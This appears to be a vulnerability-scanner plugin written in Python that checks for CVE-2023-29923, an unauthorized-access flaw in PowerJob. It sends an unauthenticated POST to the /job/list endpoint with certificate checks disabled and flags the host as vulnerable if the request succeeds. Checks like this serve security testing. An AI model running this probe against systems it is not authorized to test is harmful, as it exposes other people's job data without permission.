#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import json
def msg():
  ret = {}
  ret['links'] = 'https://github.com/1820112015/CVE-2023-29923'
  ret['huixian'] = ''
  ret['method'] = 'post'
  ret['bugname'] = "PowerJob未授权访问漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
    ret = msg()
    target = "/job/list"
    url1 = url + target
    ret['url'] = url1
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type':'application/json;charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
    }
    data = {
        "appId":1,
        "index":0,
        "pageSize":10
    }
    try:
        res = requests.post(url=url1,headers=header,json=data,verify=False,timeout=3).json()
        if res['success']:
            ret['ifbug'] = True
            res.close()
            return ret
        else:
            return ret
    except:
        return ret 
